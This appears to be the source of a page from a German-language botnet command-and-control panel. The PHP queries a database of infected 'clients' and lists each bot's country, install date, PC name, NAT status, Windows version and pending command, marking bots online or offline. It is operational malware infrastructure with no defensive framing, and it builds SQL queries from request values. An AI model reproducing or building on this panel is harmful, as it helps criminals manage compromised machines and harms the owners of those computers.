<table width="750" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td width="25%">Bots von: </td>
        <td width="25%"><input name="von" type="text" id="von" value="0" size="10"></td>
        <td width="25%">Menge:</td>
        <td width="25%"><input name="menge" type="text" id="menge" value="20" size="10"></td>
      </tr>

      <tr>
        <td>&nbsp;</td>
        <td>&nbsp;</td>
        <td>
          <div align="right">
            <input onclick="refreshBotsO(document.getElementById('von').value, document.getElementById('menge').value);" name="show2" type="submit" id="show2" value="Nur Online" />
          </div>
        </td>
        <td><div align="right">
          <input onclick="refreshBots(document.getElementById('von').value, document.getElementById('menge').value);" name="show" type="submit" id="show" value="Anzeigen" />
        </div></td>
      </tr>
    </table></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td><table width="750" border="0" cellspacing="1" cellpadding="0">
      <tr>
        <td width="93" bgcolor="#CCCCCC"><strong>Land</strong></td>
        <td width="91" bgcolor="#CCCCCC"><strong>Installiert</strong></td>
        <td width="156" bgcolor="#CCCCCC"><strong>PC Name</strong> </td>
        <td width="37" bgcolor="#CCCCCC"><strong>Nat</strong></td>
        <td width="139" bgcolor="#CCCCCC"><strong>Windows</strong></td>
        <td width="234" bgcolor="#CCCCCC"><strong>Befehl</strong></td>
      </tr>
      <tr>
        <td>&nbsp;</td>
        <td>&nbsp;</td>
        <td>&nbsp;</td>
        <td>&nbsp;</td>
        <td>&nbsp;</td>
        <td>&nbsp;</td>
      </tr>
      <?php
	  include("inc/config.php");
	  include("inc/funcs.php");
	  if (dRead("on") == "sure") {
   	  	  $sql = "SELECT * FROM `clients` WHERE `connect` > ".(time()-$time_on);
	  } else {
	  	  $sql = "SELECT * FROM `clients` WHERE 1";
	  }	  
	  if (isset($_POST['von']) && isset($_POST['menge'])) {
	  	$sql .= " LIMIT ".dRead('von').",".dRead('menge');
	  }
	  $sql .= ";";
	  $res = mysql_query($sql);
	  for($i=0;$i<mysql_num_rows($res);$i++)
	  {
	  	$data = mysql_fetch_array($res);
		echo '<tr bgcolor="#';
		if ($data['connect'] >= (time() - $time_on)) {
			// online
			echo "00FF33";
		} else {
			// offline
			echo "FF3300";
		}
		echo '"><td>'.$data['country']."</td><td>".date("j.n.y", $data['install'])."</td><td>".$data['pcname']."</td><td>".$data['nat']."</td><td>".$data['winver']."</td><td>".$data['cmd']."</td></tr>";
	  	
	}
	  ?>
    </table></td>
  </tr>
</table>
